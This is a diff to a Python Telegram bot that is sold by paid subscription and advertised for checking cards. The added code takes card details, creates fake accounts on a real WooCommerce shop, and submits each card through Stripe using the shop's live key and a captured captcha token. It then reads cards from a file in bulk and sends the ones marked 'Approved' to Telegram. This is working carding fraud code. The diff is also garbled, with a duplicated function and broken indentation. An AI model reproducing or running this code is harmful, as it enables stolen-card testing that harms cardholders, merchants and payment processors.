@@ -648,4 +648,384 @@ def start(message):
 	  "time": ig,
 			}
 			}
-			existing_data.update
+			existing_data.update(new_data)
+			 with open('data.json', 'w') as json_file:
+				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
+			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
+		
+𝗣𝗟𝗔𝗡 ➜ {plan}
+𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
+𝗞𝗘𝗬 ➜ <code>{pas}</code>
+		
+𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
+			bot.reply_to(message,msg,parse_mode="HTML")
+		except Exception as e:
+			print('ERROR : ',e)
+			bot.reply_to(message,e,parse_mode="HTML")
+	my_thread = threading.Thread(target=my_function)
+	my_thread.start()
+@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
+def respond_to_vbv(message):
+	id=message.from_user.id
+	name = message.from_user.first_name
+	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
+	with open('data.json', 'r') as file:
+		json_data = json.load(file)
+	try:BL=(json_data[str(id)]['plan'])
+	except:
+		with open('data.json', 'r') as json_file:
+			existing_data = json.load(json_file)
+		new_data = {
+			id : {
+  "plan": "𝗙𝗥𝗘𝗘",
+  "timer": "none",
+			}
+		}
+		BL='𝗙𝗥𝗘𝗘'
+		existing_data.update(new_data)
+		with open('data.json', 'w') as json_file:
+			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
+	if BL == '𝗙𝗥𝗘𝗘':
+		keyboard = types.InlineKeyboardMarkup()
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
+		keyboard.add(contact_button)
+		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
+This Particular Bot is not Free
+If you want use it, You must purchase a Weekly or Monthly Subscription
+
+The Bots job is to Check Cards
+
+Bot Subscription Price:
+   
+IRAQ ➜ Fast Pay - Korek
+2 Days ➜ $1
+3 Days ➜ $2
+1 WEEK ➜ $5
+1 MONTH ➜ $8
+
+Worldwide ➜ USDT - LTC - Binance
+2 Days ➜ $1
+3 Days ➜ $2
+1 WEEK ➜ $5
+1 MONTH ➜ $8
+
+Click to /cmds to view the commands
+
+Your Plan now ({BL})</b>
+''',reply_markup=keyboard)
+		return
+	with open('data.json', 'r') as file:
+		json_data = json.load(file)
+		date_str=json_data[str(id)]['timer'].split('.')[0]
+	try:
+		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
+	except Exception as e:
+		keyboard = types.InlineKeyboardMarkup()
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
+		keyboard.add(contact_button)
+		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
+This Particular Bot is not Free
+If you want use it, You must purchase a Weekly or Monthly Subscription
+
+The Bots job is to Check Cards
+
+Bot Subscription Price:
+    
+IRAQ ➜ Fast Pay - Korek
+2 Days ➜ $1
+3 Days ➜ $2
+1 WEEK ➜ $5
+1 MONTH ➜ $8
+
+Worldwide ➜ USDT - LTC - Binance
+2 Days ➜ $1
+3 Days ➜ $2
+1 WEEK ➜ $5
+1 MONTH ➜ $8
+
+Click to /cmds to view the commands
+
+Your Plan now ({BL})</b>
+''',reply_markup=keyboard)
+		return
+	current_time = datetime.now()
+	required_duration = timedelta(hours=0)
+	if current_time - provided_time > required_duration:
+		keyboard = types.InlineKeyboardMarkup()
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
+		keyboard.add(contact_button)
+		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
+	''',reply_markup=keyboard)
+		with open('data.json', 'r') as file:
+			json_data = json.load(file)
+		json_data[str(id)]['timer'] = 'none'
+		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
+		with open('data.json', 'w') as file:
+			json.dump(json_data, file, indent=2)
+		return
+	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
+	try:
+		cc = message.reply_to_message.text
+	except:
+		cc=message.text
+	cc=str(reg(cc))
+	if cc == 'None':
+		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
+Please ensure you enter the card details in the correct format:
+Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
+		return
+	start_time = time.time()
+	try:
+		
+		n = cc.split("|")[0]
+		mm = cc.split("|")[1]
+		yy = cc.split("|")[2]
+		cvc = cc.split("|")[3]
+		
+		import requests,re,base64
+		r = requests.session()
+		
+	import requests,random,string
+def chk(cc):
+	import requests
+	rs=requests.session()
+	def gen_email():
+		    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
+		
+		    name_length = 8
+		    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
+		    domain = random.choice(domains)
+		    email = f"{name}@{domain}"
+		    return email
+	headers = {
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	response = rs.get('https://www.workerkit.com/my-account/',headers=headers)
+	nonce=(response.text.split('"_wpnonce" value="')[1].split('"')[0])
+	params = {
+	    'action': 'register'}
+	data = {
+	    'email': gen_email(),
+	    'email_2': '',
+	    'wc_order_attribution_source_type': 'typein',
+	    'wc_order_attribution_referrer': '(none)',
+	    'wc_order_attribution_utm_campaign': '(none)',
+	    'wc_order_attribution_utm_source': '(direct)',
+	    'wc_order_attribution_utm_medium': '(none)',
+	    'wc_order_attribution_utm_content': '(none)',
+	    'wc_order_attribution_utm_id': '(none)',
+	    'wc_order_attribution_utm_term': '(none)',
+	    'wc_order_attribution_utm_source_platform': '',
+	    'wc_order_attribution_utm_creative_format': '',
+	    'wc_order_attribution_utm_marketing_tactic': '',
+	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/payment-methods/',
+	    'wc_order_attribution_session_start_time': '2024-10-16 04:07:01',
+	    'wc_order_attribution_session_pages': '2',
+	    'wc_order_attribution_session_count': '1',
+	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    '_wpnonce': nonce,
+	    '_wp_http_referer': '/my-account/payment-methods/',
+	    'register': 'Register',
+	}
+	
+	response = rs.post('https://www.workerkit.com/my-account/add-payment-method', params=params, headers=headers, data=data)
+	nonce=(response.text.split('add_card_nonce":"')[1].split('"')[0])
+	n,mm,yy,cvc=cc.split('|')
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=+&billing_details[email]=hshsbw%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=63882531-a3ba-45bf-8e52-1d625f36e89b98cb7d&payment_user_agent=stripe.js%2F33292c709a%3B+stripe-js-v3%2F33292c709a%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=24064&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZEl5b1Jnc3o4d2ZPdGJId0tJc2RyUkZhWDVoMi81Rlp2Wm9rUmhiMjhjTEtjK3IxOW03YnA0K3ZCa1VaTjNOZGduTmVSbVFnMytPdUxTa2tmTUZidGU4bWI4b3JsTDdxcWpDSXN5OXBVK2Y4QnFlbk83YUFITE1XZ0Q4SFp5ay9Kc1pFVG9sbmVJYXpiN09CWVh0TTVQOFpGNktQVnFnTUNmZ0ZyZ3RlYTg5TlBiVkhEU0NrUkNZNDd5Q1YyakEyZ3BJZW8xYk9wcFJvSWlVMk5qbndzS0RjTTMxNDA3dFlLNHFJKy94R2t1NDdIZG9rZmZ2cGI0SzFYV2JId3cxS0JxdXp0Qm9MSlVjNUMyUWlqTmoxYkp2aFQ0d0tlUXFjY011bnBseXUrWGFWYTdFcHdRY3N2eWFPLzBjWFQxY0V2NURUR0V1aDZuT1dhYkkyUUJObGZIQTZXUFFvVDlNcE93NHJtWlY2dCt5cTl3dmRzTHUrcjdrNnlRNXB6cXB1TklWSTlVMzNtMUU5WGMwUURYanM1eFByN0RKdGZxYTdkbDQvdmZOZGlvNlpKUHZPSXgyZGVkZ3RVT2hUS1FxTHRGRHYrVWtEV3RyOGt2ZlBLZ2tVUXVza0poTGlaYU1oQ3E5TkVDNE1CRTQ0ZEkvR2hqNEQraFBpSVZPbGlQdmJ5RzY5R3lxRmN3U29YSlQ2MmpuTlVJUlNlMzlZVEtIT3c0KzBKcGh1V0hRV0RoWWZKeGMrSXR6eHpZblVrUHlCRklCN2N0SG1nWTlwTGxHWkVVdC80cGF0NFBxaWlnZ0xzYU5vaHpxYjVBRFArRnlOUXpZazFDRHl0Zjk2QlNqYlhOLzBJSnpTTGJPSTY4U2s2alZTSHB3SENEMWl6VGJiUXZDUzFZM05sUkYrMm4yUUNxemtwRTg3OWxyR2czMjZKd0NXRUgrWFQ3RjRXcWNLczRncTRGTS9Nck9jYjJmeTYySTFjc1ZlWmtMTW1YMGtCZFRTR09XMFNodW5mY0IvWEhBZ0wrQTVuaXZWT0FJdWliTytCUGtVTDZYTXA5U2dCcjRiUDN6cC9NdjZQSzNka0pIYUVaUEhzdGVKNU14TDhvZ3NCbXNKSmQ0ekRWWTFBU2c2R1RXSzNtMFNSdmFxTTcxeHVYQXFZZTF5dUQycDA2akpmS1VPME9JaHkzdnFUekM0OC9mTTRDSDdRM1pjKzM4bk5IKzFtKzdwRmx6Skk3KzU5V0Z3RVNMU2xuVHZjRXc3TTkzVkFJcGYrTTVEWlZlU0FjNnoyaWtaeEJZSzE0SWYyR2oya1FhRUJiYUJzRGVhWmVUTVd2eXFYTTNtR3JkQ1BwekZ1bTkxOXEwbG93YUQwVzBteDk2RzBuVGlEN0pWdm5lUksyQis0NXdWL0J5dlQ3Z1pNbWo3UXZiQmRXbWhyTXczVVFIQjA5UzlGcW4zQXZqSnZJYkVNbWNHWTd3NS9WNUpSaE1UaUlPbjVHUTkzdUx2OHFUY2ZFdzhlcU1yL2MvU1UvcFdHeFhrTTFPODY4d09mYU84Y1NzOUNZZXd3eWN1MzhXVVZ2ZXBjTjl1Z0xHblpteGhzRGJFUmt0OGpNZlcrekF1SnlXUVZYenBDclkrL3B0RHRBSGNxT2dXZXNVOVVlaWVLV1duaUNSZWZzRXlJMXczYTkwajRVMUxGVlNjQmdVNDNNdk10OSthd0diMDlYcmVmbU1FS1MwSllMczlLWlUzS3lZSml6cnZxUlhaVG1oYjVYSlFKbU9RNGhOM0x2aHZ1RnNiYXo0MkcveU1YcXF3Z0sybEJRRXhqK2wxYlEwbFpCSmUyTEI0aUtBU3VjSUpZVkRyM0c3MVBjaHJJdFdzRDBuZExEWElqYzBzbXMxZkFiRGJ0NG1yMnJjNkt6NTdpeVNOUnFWbWJqcG8vRVFOMFZqV1NKK0lkMmhWYXpuUUhjSW90OEk4RERXelRVTG1OOFU5MUxLdklUMzQ1UGJ0N3RaVFA3bHhHUG5IeS95d3lCTHNMV25qTnU5azdBWnVtdE1hdWowdDJyVEpJazYxZTJpT09ZUG9Mek84M040Q1JiN21FOUJzREFQYWI0VUVpejJTTG01cTZBTlpnQVhEd0RtYVhKU0d0K0YrVWFIVk54eG80NXNoeHRJRlNkWEQyMTRtaTloRDdTUW9yM2VIVzZydjIvRUFYeTQ4MWNPa01kUEJLenJNZEgyNGo4T1NnL3RWUWNHeElSOEtpbjNsZEQxNmZoQmFtZEFLc0VmWlZFNlRpQzIySXhqR3RDbDhjMTZMZFdvOFRlVTZ5WGo2eXZlT3Z1SUZTelQ4Rmt0UW1lcXhyNG5FaVZTbUlSeE9FL2xwd0UzbktEcndvTE9iSVFwN3A0Wi93ZkFXSjBodk5MWGRGNmpxc013VjZTa0JvdWVJcXFOZzQwb3oxc2pDVHgwY0NzT1dZS2JxaHRJcVY1YTFxUDk0NFYzNU9lWkVZVEZqeGJmYWJ2cGZQbTlRZFNESWtrR2trN2NEa2dEN1p3NVV5azZRSzJvVmNEUFVvM2F6YXdMT092bFRRWUtPbnBHM0dpVGNNMVpUYThTeW1MUUQxME9kZHlramk3TC90Q3F0bm1ITG1oVlg1SlhNUUZTbXgzMWxDU1FvN2hxUU9EUXhzRXYzSUZOV0Z3NTF4M0ZRdElmZXR0VE83dHJrS2tLV2gvell4THVFNkEwV0c2YVlHcE1Jb1hUeG4zWEZ3d1BNTnE4N2FOazNWd2F6aWVlNk5WaWlNN1h0U244a1lWRHo4WXlXM2pKUExyZjJzTlAreXhLNU5HalJ5UEVGWElETFRBPT0iLCJleHAiOjE3MjkwNTA4NDAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzZlMDlhZCIsInBkIjowLCJjZGF0YSI6Im9ndVU5KytTd25CQWhlODhpTHN1TkVWSHpSeGNrMW1PcWJwTzJPQnhDZmk1aHlhRk5XUDNZYW9UbmdxRHc3VXFBaUJ1N3BiREtRbVRYV05KNFhiYXhLdUJDbE1jcCtqTzBKM1hOK0hvU0NvNWcrVnNjUEpEbFcwTklWMGw5dmpxWWJ3QktMRlVobE1ldFBxU0tJWTJFVnhrandFTDBhNTZmcUZUemFoYk5pb2I1SzhaYlQ0ZDA0ZHpZMVkwd1ZQcm96aEFWcFFEWW4zZksyS0MifQ.N0j0dZFyIDx79PwbqmZEyn1CludlaF_MVLx2VyUjp1A'
+	
+	response = rs.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	id=(response.json()['id'])
+	import requests
+	
+	headers = {
+	    'authority': 'www.workerkit.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	     'origin': 'https://www.workerkit.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    'wc-ajax': 'wc_stripe_create_setup_intent',
+	}
+	
+	data = {
+	    'stripe_source_id': id,
+	    'nonce': nonce,
+	}
+	
+	response = rs.post('https://www.workerkit.com/', params=params, cookies=rs.cookies, headers=headers, data=data)
+import requests,random,string
+def chk(cc):
+	import requests
+	rs=requests.session()
+	def gen_email():
+		    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
+		
+		    name_length = 8
+		    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
+		    domain = random.choice(domains)
+		    email = f"{name}@{domain}"
+		    return email
+	headers = {
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	response = rs.get('https://www.workerkit.com/my-account/',headers=headers)
+	nonce=(response.text.split('"_wpnonce" value="')[1].split('"')[0])
+	params = {
+	    'action': 'register'}
+	data = {
+	    'email': gen_email(),
+	    'email_2': '',
+	    'wc_order_attribution_source_type': 'typein',
+	    'wc_order_attribution_referrer': '(none)',
+	    'wc_order_attribution_utm_campaign': '(none)',
+	    'wc_order_attribution_utm_source': '(direct)',
+	    'wc_order_attribution_utm_medium': '(none)',
+	    'wc_order_attribution_utm_content': '(none)',
+	    'wc_order_attribution_utm_id': '(none)',
+	    'wc_order_attribution_utm_term': '(none)',
+	    'wc_order_attribution_utm_source_platform': '',
+	    'wc_order_attribution_utm_creative_format': '',
+	    'wc_order_attribution_utm_marketing_tactic': '',
+	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/payment-methods/',
+	    'wc_order_attribution_session_start_time': '2024-10-16 04:07:01',
+	    'wc_order_attribution_session_pages': '2',
+	    'wc_order_attribution_session_count': '1',
+	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    '_wpnonce': nonce,
+	    '_wp_http_referer': '/my-account/payment-methods/',
+	    'register': 'Register',
+	}
+	
+	response = rs.post('https://www.workerkit.com/my-account/add-payment-method', params=params, headers=headers, data=data)
+	nonce=(response.text.split('add_card_nonce":"')[1].split('"')[0])
+	n,mm,yy,cvc=cc.split('|')
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=+&billing_details[email]=hshsbw%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=63882531-a3ba-45bf-8e52-1d625f36e89b98cb7d&payment_user_agent=stripe.js%2F33292c709a%3B+stripe-js-v3%2F33292c709a%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=24064&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZEl5b1Jnc3o4d2ZPdGJId0tJc2RyUkZhWDVoMi81Rlp2Wm9rUmhiMjhjTEtjK3IxOW03YnA0K3ZCa1VaTjNOZGduTmVSbVFnMytPdUxTa2tmTUZidGU4bWI4b3JsTDdxcWpDSXN5OXBVK2Y4QnFlbk83YUFITE1XZ0Q4SFp5ay9Kc1pFVG9sbmVJYXpiN09CWVh0TTVQOFpGNktQVnFnTUNmZ0ZyZ3RlYTg5TlBiVkhEU0NrUkNZNDd5Q1YyakEyZ3BJZW8xYk9wcFJvSWlVMk5qbndzS0RjTTMxNDA3dFlLNHFJKy94R2t1NDdIZG9rZmZ2cGI0SzFYV2JId3cxS0JxdXp0Qm9MSlVjNUMyUWlqTmoxYkp2aFQ0d0tlUXFjY011bnBseXUrWGFWYTdFcHdRY3N2eWFPLzBjWFQxY0V2NURUR0V1aDZuT1dhYkkyUUJObGZIQTZXUFFvVDlNcE93NHJtWlY2dCt5cTl3dmRzTHUrcjdrNnlRNXB6cXB1TklWSTlVMzNtMUU5WGMwUURYanM1eFByN0RKdGZxYTdkbDQvdmZOZGlvNlpKUHZPSXgyZGVkZ3RVT2hUS1FxTHRGRHYrVWtEV3RyOGt2ZlBLZ2tVUXVza0poTGlaYU1oQ3E5TkVDNE1CRTQ0ZEkvR2hqNEQraFBpSVZPbGlQdmJ5RzY5R3lxRmN3U29YSlQ2MmpuTlVJUlNlMzlZVEtIT3c0KzBKcGh1V0hRV0RoWWZKeGMrSXR6eHpZblVrUHlCRklCN2N0SG1nWTlwTGxHWkVVdC80cGF0NFBxaWlnZ0xzYU5vaHpxYjVBRFArRnlOUXpZazFDRHl0Zjk2QlNqYlhOLzBJSnpTTGJPSTY4U2s2alZTSHB3SENEMWl6VGJiUXZDUzFZM05sUkYrMm4yUUNxemtwRTg3OWxyR2czMjZKd0NXRUgrWFQ3RjRXcWNLczRncTRGTS9Nck9jYjJmeTYySTFjc1ZlWmtMTW1YMGtCZFRTR09XMFNodW5mY0IvWEhBZ0wrQTVuaXZWT0FJdWliTytCUGtVTDZYTXA5U2dCcjRiUDN6cC9NdjZQSzNka0pIYUVaUEhzdGVKNU14TDhvZ3NCbXNKSmQ0ekRWWTFBU2c2R1RXSzNtMFNSdmFxTTcxeHVYQXFZZTF5dUQycDA2akpmS1VPME9JaHkzdnFUekM0OC9mTTRDSDdRM1pjKzM4bk5IKzFtKzdwRmx6Skk3KzU5V0Z3RVNMU2xuVHZjRXc3TTkzVkFJcGYrTTVEWlZlU0FjNnoyaWtaeEJZSzE0SWYyR2oya1FhRUJiYUJzRGVhWmVUTVd2eXFYTTNtR3JkQ1BwekZ1bTkxOXEwbG93YUQwVzBteDk2RzBuVGlEN0pWdm5lUksyQis0NXdWL0J5dlQ3Z1pNbWo3UXZiQmRXbWhyTXczVVFIQjA5UzlGcW4zQXZqSnZJYkVNbWNHWTd3NS9WNUpSaE1UaUlPbjVHUTkzdUx2OHFUY2ZFdzhlcU1yL2MvU1UvcFdHeFhrTTFPODY4d09mYU84Y1NzOUNZZXd3eWN1MzhXVVZ2ZXBjTjl1Z0xHblpteGhzRGJFUmt0OGpNZlcrekF1SnlXUVZYenBDclkrL3B0RHRBSGNxT2dXZXNVOVVlaWVLV1duaUNSZWZzRXlJMXczYTkwajRVMUxGVlNjQmdVNDNNdk10OSthd0diMDlYcmVmbU1FS1MwSllMczlLWlUzS3lZSml6cnZxUlhaVG1oYjVYSlFKbU9RNGhOM0x2aHZ1RnNiYXo0MkcveU1YcXF3Z0sybEJRRXhqK2wxYlEwbFpCSmUyTEI0aUtBU3VjSUpZVkRyM0c3MVBjaHJJdFdzRDBuZExEWElqYzBzbXMxZkFiRGJ0NG1yMnJjNkt6NTdpeVNOUnFWbWJqcG8vRVFOMFZqV1NKK0lkMmhWYXpuUUhjSW90OEk4RERXelRVTG1OOFU5MUxLdklUMzQ1UGJ0N3RaVFA3bHhHUG5IeS95d3lCTHNMV25qTnU5azdBWnVtdE1hdWowdDJyVEpJazYxZTJpT09ZUG9Mek84M040Q1JiN21FOUJzREFQYWI0VUVpejJTTG01cTZBTlpnQVhEd0RtYVhKU0d0K0YrVWFIVk54eG80NXNoeHRJRlNkWEQyMTRtaTloRDdTUW9yM2VIVzZydjIvRUFYeTQ4MWNPa01kUEJLenJNZEgyNGo4T1NnL3RWUWNHeElSOEtpbjNsZEQxNmZoQmFtZEFLc0VmWlZFNlRpQzIySXhqR3RDbDhjMTZMZFdvOFRlVTZ5WGo2eXZlT3Z1SUZTelQ4Rmt0UW1lcXhyNG5FaVZTbUlSeE9FL2xwd0UzbktEcndvTE9iSVFwN3A0Wi93ZkFXSjBodk5MWGRGNmpxc013VjZTa0JvdWVJcXFOZzQwb3oxc2pDVHgwY0NzT1dZS2JxaHRJcVY1YTFxUDk0NFYzNU9lWkVZVEZqeGJmYWJ2cGZQbTlRZFNESWtrR2trN2NEa2dEN1p3NVV5azZRSzJvVmNEUFVvM2F6YXdMT092bFRRWUtPbnBHM0dpVGNNMVpUYThTeW1MUUQxME9kZHlramk3TC90Q3F0bm1ITG1oVlg1SlhNUUZTbXgzMWxDU1FvN2hxUU9EUXhzRXYzSUZOV0Z3NTF4M0ZRdElmZXR0VE83dHJrS2tLV2gvell4THVFNkEwV0c2YVlHcE1Jb1hUeG4zWEZ3d1BNTnE4N2FOazNWd2F6aWVlNk5WaWlNN1h0U244a1lWRHo4WXlXM2pKUExyZjJzTlAreXhLNU5HalJ5UEVGWElETFRBPT0iLCJleHAiOjE3MjkwNTA4NDAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzZlMDlhZCIsInBkIjowLCJjZGF0YSI6Im9ndVU5KytTd25CQWhlODhpTHN1TkVWSHpSeGNrMW1PcWJwTzJPQnhDZmk1aHlhRk5XUDNZYW9UbmdxRHc3VXFBaUJ1N3BiREtRbVRYV05KNFhiYXhLdUJDbE1jcCtqTzBKM1hOK0hvU0NvNWcrVnNjUEpEbFcwTklWMGw5dmpxWWJ3QktMRlVobE1ldFBxU0tJWTJFVnhrandFTDBhNTZmcUZUemFoYk5pb2I1SzhaYlQ0ZDA0ZHpZMVkwd1ZQcm96aEFWcFFEWW4zZksyS0MifQ.N0j0dZFyIDx79PwbqmZEyn1CludlaF_MVLx2VyUjp1A'
+	
+	response = rs.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	id=(response.json()['id'])
+	import requests
+	
+	headers = {
+	    'authority': 'www.workerkit.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	     'origin': 'https://www.workerkit.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    'wc-ajax': 'wc_stripe_create_setup_intent',
+	}
+	
+	data = {
+	    'stripe_source_id': id,
+	    'nonce': nonce,
+	}
+	
+	response = rs.post('https://www.workerkit.com/', params=params, cookies=rs.cookies, headers=headers, data=data)
+
+	try:
+		return (response.json()['error']['message'])
+	except:return('Approved')
+# Open the file to save approved results
+with open('approved_results.txt', 'w') as approved_file:
+    # Read credit cards from file
+    ccs = open('ccs.txt', 'r').readlines()
+
+    # Process each credit card
+    for cc in ccs:
+        cc = cc.strip()
+        try:
+            result = chk(cc)
+        except Exception as e:
+            result = f"Error: {str(e)}"
+
+        # Print result with conditional coloring
+        if result == 'Approved':
+            text = Text(f"{cc} = {result}", style="bold green")
+            message = f"""
+𝗖𝗮𝗿𝗱: » `{cc.strip()}`
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » 1000: Approved
+𝗦𝘁𝗮𝘁𝘂𝘀: » Card Add Successfully ✅
+𝗢𝘄𝗻𝗲𝗿: » @Barry_op
+"""
+            send_telegram_message(message)
+            console.print(text)
+            # Save the approved result to the file
+            approved_file.write(f"{cc} = {result}\n")
+            console.print("Approved card saved successfully.", style="bold cyan")
+        else:
+            console.print(f"{cc} = {result}", style="bold red")
+	else:
+		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
+@bot.callback_query_handler(func=lambda call: call.data == 'stop')
+def menu_callback(call):
+	id=call.from_user.id
+	stopuser[f'{id}']['status'] = 'stop'
+print("تم تشغيل البوت")
+while True:
+	try:
+		bot.polling(none_stop=True)
+	except Exception as e:
+		print(f"حدث خطأ: {e}")
